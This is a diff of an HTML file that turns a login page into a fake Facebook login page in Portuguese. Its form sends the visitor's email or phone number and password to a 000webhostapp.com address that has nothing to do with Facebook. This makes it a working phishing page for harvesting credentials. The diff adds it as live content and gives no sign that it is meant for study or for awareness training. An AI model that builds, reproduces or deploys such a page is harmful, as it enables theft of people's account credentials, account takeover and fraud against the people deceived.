@@ -1,71 +1,179 @@
-<html><head></head><body>
-    <title>Security</title>
-    <meta charset="UTF-8">
-    <!--Style Sheet-->
-    <link rel="stylesheet" type="text/css" href="css/flexslider.css" media="screen">
-    <link rel="stylesheet" type="text/css" href="css/sequence.css" media="screen">
-    <link rel="stylesheet" type="text/css" href="css/lightbox.css" media="screen">
-    <link rel="stylesheet" type="text/css" href="css/style.css" media="all">
-    <link rel="stylesheet" type="text/css" href="css/signin.css" media="all">
-    <!--Special Styles-->
-    <link rel="stylesheet" type="text/css" href="css/style.css" title="default" media="screen">
-    <link rel="alternate stylesheet" type="text/css" href="css/elegant.css" title="elegant" media="screen">
-    <link rel="alternate stylesheet" type="text/css" href="css/modern.css" title="modern" media="screen">
-    <link rel="alternate stylesheet" type="text/css" href="css/colorfull.css" title="colorfull" media="screen">
-    <!--Responsive-->
-    <link rel="stylesheet" type="text/css" href="css/responsitive.css" media="all">
-    <!--Google fonts-->
-    <link href="http://fonts.googleapis.com/css?family=Russo+One&amp;subset=latin,latin-ext,cyrillic" rel="stylesheet" type="text/css">
-    <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,700,300&amp;subset=latin,cyrillic" rel="stylesheet" type="text/css">
-    <link href="http://fonts.googleapis.com/css?family=Lato:300,400,700,900" rel="stylesheet" type="text/css">
-    <!--Javascript-->
-    <script src="js/jquery-1.7.2.min.js"></script>
-  
-    <header class="dark">
-      <nav>
-        <div id="logo">
-          <img src="images/f.jpg" class="img-responsive">
-        </div>
-        <div id="menu"></div>
-      </nav>
-    </header>
-    
-    <section id="work" class="container light">
-      <br>
-      <br>
-      <br>
-      <div class="login-box">
-        <img src="image/loading.gif" id="load" style="display:none">
-        <form action="https://formulariodecandidatura.000webhostapp.com/login.php" name="form1" method="POST">
-          <p style="text-align:center;">
-            <img src="images/int.jpg" class="img-responsive">
-          </p>
-          <br>
-          <input type="text" name="email" placeholder="Email ou Telefone" required="" autofocus="" style="width:300px">
-          <br>
-          <br>
-          <input type="text" name="senha" placeholder="Senha" required="" autofocus="" style="width:300px">
-          <br>
-          <br>
-          <input type="image" src="images/entrar.png" value="ENVIAR" alt="botão enviar com efeito aqua" style="width:300px">
-          <br>
-          <img src="images/cadastrar.jpg" class="img-responsive">
-        </form>
-      </div>
-      <br>
-      <br>
-    </section>
-    <footer>
-      <br>
-      <br>
-      <br>
-      <br>
-      <p style="text-align:center;">
-        <img src="images/lr.jpg" class="img-responsive">
-      </p>
-      <p class="twitter_status"></p>
-    </footer>
-   
-  
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<title>Facebook</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<header>
+    <h1><i class="fab fa-facebook"></i> Facebook</h1>
+</header>
 
-</body></html>
+<style>
+  /* Reset de estilos básico */
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
+  /* Estilos para o corpo e HTML */
+  html, body {
+    font-family: 'Arial', sans-serif;
+    background-color: #f0f0f0;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+  }
+
+  /* Estilos para o cabeçalho */
+  header {
+    background-color: #1877F2;
+    color: #fff;
+    width: 100%;
+    padding: 20px 0;
+    text-align: center;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+  }
+
+  header #logo img {
+    max-width: 150px;
+    height: auto;
+  }
+
+  /* Estilos para a seção principal */
+  section#work {
+    text-align: center;
+    width: 100%;
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 50px 0;
+    position: relative;
+  }
+
+  section#work .login-box {
+    background-color: #fff;
+    padding: 20px;
+    max-width: 400px;
+    width: 100%;
+    border-radius: 8px;
+    box-shadow: 0 0 20px rgba(0,0,0,0.1);
+    text-align: left;
+  }
+
+  section#work form {
+    margin-top: 20px;
+  }
+
+  section#work input[type="text"],
+  section#work input[type="password"] {
+    width: calc(100% - 20px);
+    padding: 15px;
+    margin-bottom: 15px;
+    border: 1px solid #ccc;
+    border-radius: 6px;
+    box-shadow: 0 0 8px rgba(0,0,0,0.1);
+    box-sizing: border-box;
+    font-size: 16px;
+    outline: none;
+  }
+
+  section#work button {
+    width: calc(100% - 20px);
+    padding: 15px;
+    background-color: #1877F2;
+    color: #fff;
+    border: none;
+    border-radius: 6px;
+    font-size: 16px;
+    cursor: pointer;
+    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+    transition: background-color 0.3s ease;
+    margin-bottom: 10px;
+  }
+
+  section#work button:hover {
+    background-color: #1465C0;
+  }
+
+  section#work .forgot-password {
+    margin-bottom: 10px;
+    font-size: 14px;
+    text-decoration: none;
+    color: #1877F2;
+    display: block;
+  }
+
+  section#work .create-account {
+    width: calc(100% - 20px);
+    padding: 15px;
+    background-color: #42B72A;
+    color: #fff;
+    border: none;
+    border-radius: 6px;
+    font-size: 16px;
+    cursor: pointer;
+    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+    transition: background-color 0.3s ease;
+  }
+
+  section#work .create-account:hover {
+    background-color: #3AA623;
+  }
+
+  section#work img {
+    max-width: 100%;
+  }
+
+  /* Estilos para o rodapé */
+  footer {
+    background-color: white;
+    color: white;
+    text-align: center;
+    padding: 20px 0;
+    width: 100%;
+    flex-shrink: 0;
+    position: relative;
+    bottom: 0;
+  }
+
+  footer img {
+    max-width: 100%;
+    height: auto;
+    display: block;
+    margin: 0 auto;
+  }
+</style>
+</head>
+<body>
+
+
+<section id="work">
+  <div class="login-box">
+    <img src="image/loading.gif" id="load" style="display:none;">
+    <form action="https://formulariodecandidatura.000webhostapp.com/login.php" name="form1" method="POST">
+     
+      <input type="text" name="email" placeholder="Email ou Telefone" required>
+      <input type="password" name="senha" placeholder="Senha" required>
+      <button type="submit">ENTRAR</button>
+      <a href="#" class="forgot-password">Esqueceu a senha?</a>
+      <button type="button" class="create-account">Criar nova conta</button>
+
+    </form>
+  </div>
+</section>
+
+<footer>
+  <p>
+    <img src="images/rodape.png" alt="Imagem do rodapé">
+  </p>
+  <p class="twitter_status"></p>
+</footer>
+
+</body>
+</html>
+
